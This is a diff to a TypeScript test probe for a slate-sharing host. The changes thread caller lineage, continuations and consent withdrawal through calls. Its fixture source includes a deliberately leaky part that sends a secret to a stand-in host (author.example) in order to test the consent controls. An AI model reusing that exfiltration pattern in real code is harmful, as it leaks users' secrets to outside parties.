@@ -23,7 +23,7 @@ import { SlateId } from '@agent-core/core/slates';
 import { initSlateLiveShareTables, slateDirectory } from '@kinu.run/core/slates';
 import { SlateHost } from '../../src/slates/host';
 import { initSlateBuildTable, SlateBuilds } from '@kinu.run/core/slates';
-import { ROOT_SLATE_CALLER, slateRevision, type PartRunAnswer, type PartRunRequest, type SlateCaller, type SlateConsent } from '@kinu.run/core/slates';
+import { ROOT_SLATE_CALLER, slateRevision, type PartRunAnswer, type PartRunRequest, type SlateCallFrom, type SlateCaller, type SlateConsent, type SlateLineage } from '@kinu.run/core/slates';
 import type { PartViewer } from '../../src/slates/part-runs';
 import { FakeViewerAccounts } from './personal-parts-fakes';
 import { slateBatchStub } from '../../src/slates/rpc-transport';
@@ -168,6 +168,8 @@ export class SlateShareProbeDO extends DurableObject<Cloudflare.Env> {
   #heldWrite: { readonly reached: { resolve: () => void }; readonly release: { readonly promise: Promise<void> } } | null = null;
   /** Each viewer's own account, as their parts reach it. */
   private readonly accounts = new FakeViewerAccounts();
+  /** The lineage of the process that made the last call naming a request (`slateCallAs`): what a replay presents. */
+  private lastLineage: SlateLineage | null = null;
   /** The notes slate's share (`startParts`). */
   private notesShare = '';
   /** Holds a launch where it asks for the owner's browser, until let go (`launchAcrossShare`). */
@@ -452,7 +454,7 @@ export class SlateShareProbeDO extends DurableObject<Cloudflare.Env> {
 
     // Each call is recorded where the host routes it, whatever it then answers.
     for (const [id, paths] of Object.entries(TRIAGE)) {
-      for (const path of paths) await this.host.surfaceCall(ROOT_SLATE_CALLER, id, 'workspace', { path: [...path], args: path[0] === 'mcp' || path[0] === 'agent' ? [{ text: 'x' }] : [], invocation: null });
+      for (const path of paths) await this.host.surfaceCall({ caller: ROOT_SLATE_CALLER, id: id, name: 'workspace', lineage: this.lineageNow(id) }, { path: [...path], args: path[0] === 'mcp' || path[0] === 'agent' ? [{ text: 'x' }] : [], invocation: null });
     }
   }
 
@@ -467,13 +469,13 @@ export class SlateShareProbeDO extends DurableObject<Cloudflare.Env> {
 
   /** A call a share's viewer makes with no invocation: the share must name the running call it rides. */
   async unnamedShareCall(share: string): Promise<SlateSurfaceResult> {
-    return this.host.surfaceCall({ ...ROOT_SLATE_CALLER, share }, SLATE_ID, 'workspace', { path: ['readFile'], args: ['/x'], invocation: null });
+    return this.host.surfaceCall({ caller: { ...ROOT_SLATE_CALLER, share }, id: SLATE_ID, name: 'workspace', lineage: this.lineageNow(SLATE_ID) }, { path: ['readFile'], args: ['/x'], invocation: null });
   }
 
   /** The board as its owner runs it, so its graph names what a share can grant. */
   private async exerciseBoard(): Promise<void> {
     for (const [path, args] of [[['readFile'], ['/x']], [['writeFile'], ['/x', 'fixture-bytes']], [['slates', 'digest', 'digest'], []]] as const) {
-      await this.host.surfaceCall(ROOT_SLATE_CALLER, SLATE_ID, 'workspace', { path: [...path], args: [...args], invocation: null });
+      await this.host.surfaceCall({ caller: ROOT_SLATE_CALLER, id: SLATE_ID, name: 'workspace', lineage: this.lineageNow(SLATE_ID) }, { path: [...path], args: [...args], invocation: null });
     }
   }
 
@@ -707,7 +709,7 @@ export class SlateShareProbeDO extends DurableObject<Cloudflare.Env> {
     if (admitted instanceof Response) throw new Error(`not admitted: ${admitted.status}`);
     this.host.controller.live.revoke(share);
 
-    return await this.host.surfaceCall(ROOT_SLATE_CALLER, SLATE_ID, 'workspace', { path: ['readFile'], args: ['/x'], invocation: admitted.invocation });
+    return await this.host.surfaceCall({ caller: ROOT_SLATE_CALLER, id: SLATE_ID, name: 'workspace', lineage: this.lineageNow(SLATE_ID) }, { path: ['readFile'], args: ['/x'], invocation: admitted.invocation });
   }
 
   /**
@@ -783,9 +785,7 @@ export class SlateShareProbeDO extends DurableObject<Cloudflare.Env> {
   }
 
   async replay(share: string): Promise<SlateSurfaceResult> {
-    return this.host.surfaceCall(
-      { ...ROOT_SLATE_CALLER, share }, SLATE_ID, 'workspace', { path: ['readFile'], args: ['/x'], invocation: this.lastCall },
-    );
+    return this.host.surfaceCall({ caller: { ...ROOT_SLATE_CALLER, share }, id: SLATE_ID, name: 'workspace', lineage: this.lastLineage ?? this.lineageNow(SLATE_ID) }, { path: ['readFile'], args: ['/x'], invocation: this.lastCall });
   }
 
   async requests(share: string): Promise<SlateCallResult> {
@@ -801,6 +801,11 @@ export class SlateShareProbeDO extends DurableObject<Cloudflare.Env> {
     return this.processes.getRunning().length === this.ownersOwn;
   }
 
+  /** The lineage a process of `id` started now would carry: its slate's sharing as it stands. */
+  private lineageNow(id: string): SlateLineage {
+    return { incarnation: 'probe', generation: this.host.controller.generation(id) };
+  }
+
   /** The notes slate, its parts declared, shared with Alice and Bob; Carol has no share of it. */
   async startParts(): Promise<string> {
     const root = `/slates/${NOTES}`;
@@ -813,6 +818,7 @@ export class SlateShareProbeDO extends DurableObject<Cloudflare.Env> {
         title: 'Notes', runtime: 'worker',
         parts: {
           mine: { fn: 'mine', show: 'showed' }, leaky: { fn: 'leaky' }, egress: { fn: 'egress' }, stash: { fn: 'stash' }, two: { fn: 'two' },
+          mixed: { fn: 'mixed' }, fetchArg: { fn: 'fetchArg', input: { kind: 'text', maxLength: 100 } }, streamed: { fn: 'streamed' },
           act: { fn: 'act', input: { kind: 'text', maxLength: 100 } },
         },
       },
@@ -868,12 +874,17 @@ export class SlateShareProbeDO extends DurableObject<Cloudflare.Env> {
     this.accounts.duringNext = () => { this.host.controller.live.revoke(this.notesShare); };
   }
 
-  async runPartApproved(viewer: string, part: string, approval: string): Promise<PartRunAnswer | null> {
-    return await this.host.parts.run(viewerNamed(viewer), NOTES, part, { args: [], action: null, approval });
+  /** The run a decision stopped, resumed with the continuation its answer carried. */
+  async resumePart(viewer: string, part: string, continuation: string, args: JsonValue[] = []): Promise<PartRunAnswer | null> {
+    return await this.host.parts.run(viewerNamed(viewer), NOTES, part, { args, action: null, continuation });
+  }
+
+  withdrawConsent(viewer: string, server: string, root: Record<string, string>): void {
+    this.accounts.withdraw(viewerNamed(viewer).email, { workspace: this.ctx.id.name ?? this.ctx.id.toString(), slate: NOTES, server, root });
   }
 
   async runPart(viewer: string | null, part: string, args: JsonValue[] = [], action: PartRunRequest['action'] = null): Promise<PartRunAnswer | null> {
-    return await this.host.parts.run(viewer === null ? null : viewerNamed(viewer), NOTES, part, { args, action, approval: null });
+    return await this.host.parts.run(viewer === null ? null : viewerNamed(viewer), NOTES, part, { args, action, continuation: null });
   }
 
   async showPart(viewer: 'alice' | 'bob', revision: string, value: JsonValue): Promise<SlateCallResult> {
@@ -904,13 +915,17 @@ export class SlateShareProbeDO extends DurableObject<Cloudflare.Env> {
     return await this.host.parts.call(slate, run, name, call);
   }
 
-  async slateCallAs(caller: SlateCaller, id: string, name: string, request: JsonValue): Promise<SlateSurfaceResult> {
+  async slateCallAs(from: SlateCallFrom, request: JsonValue): Promise<SlateSurfaceResult> {
     const parsed = v.safeParse(v.object({ invocation: v.nullable(v.string()) }), request);
 
-    // The close listener releases with a null invocation; a replay must present the id the slate's call carried.
-    if (parsed.success && parsed.output.invocation !== null) this.lastCall = parsed.output.invocation;
+    // The close listener releases with a null invocation; a replay must present the id the slate's call carried, from
+    // the process that carried it.
+    if (parsed.success && parsed.output.invocation !== null) {
+      this.lastCall = parsed.output.invocation;
+      this.lastLineage = from.lineage;
+    }
 
-    return this.host.surfaceCall(caller, id, name, request);
+    return this.host.surfaceCall(from, request);
   }
 }
 
@@ -961,6 +976,20 @@ const NOTES_SOURCE = [
   '    return { html: "<p>" + await this.env.workspace.mcp.Fetch.get({ url: "https://author.example/?d=" + read.secret }) + "</p>" };',
   '  }',
   '  async stash() { const before = kept; kept = (await issue(this.env)).secret; return { html: "<p>" + before + "</p>" }; }',
+  // An effect, then a read it has no consent for yet: the journal carries the effect across the consent decision.
+  '  async mixed() {',
+  '    const sent = await this.env.workspace.mcp.Fetch.get({ url: "https://a.example/" });',
+  '    const read = await issue(this.env);',
+  '    return { html: "<p>" + sent + " then " + read.secret + "</p>" };',
+  '  }',
+  // A fetch of what its frame was given: two frames of the part ask two different effects.
+  '  async fetchArg(url) { return { html: "<p>" + await this.env.workspace.mcp.Fetch.get({ url }) + " " + url + "</p>" }; }',
+  // Its viewer's own model, streamed, then an effect: a resumed run is answered the very reply, never a new one.
+  '  async streamed() {',
+  '    let reply = ""; for await (const piece of await this.env.workspace.ai.stream({ prompt: "summarize" })) reply += piece;',
+  '    const sent = await this.env.workspace.mcp.Fetch.get({ url: "https://b.example/" });',
+  '    return { html: "<p>" + reply + " / " + sent + "</p>" };',
+  '  }',
   // Two calls that may each reach anywhere, one after the other: each waits on its own approval, and each runs once.
   '  async two() {',
   '    const first = await this.env.workspace.mcp.Fetch.get({ url: "https://a.example/" });',
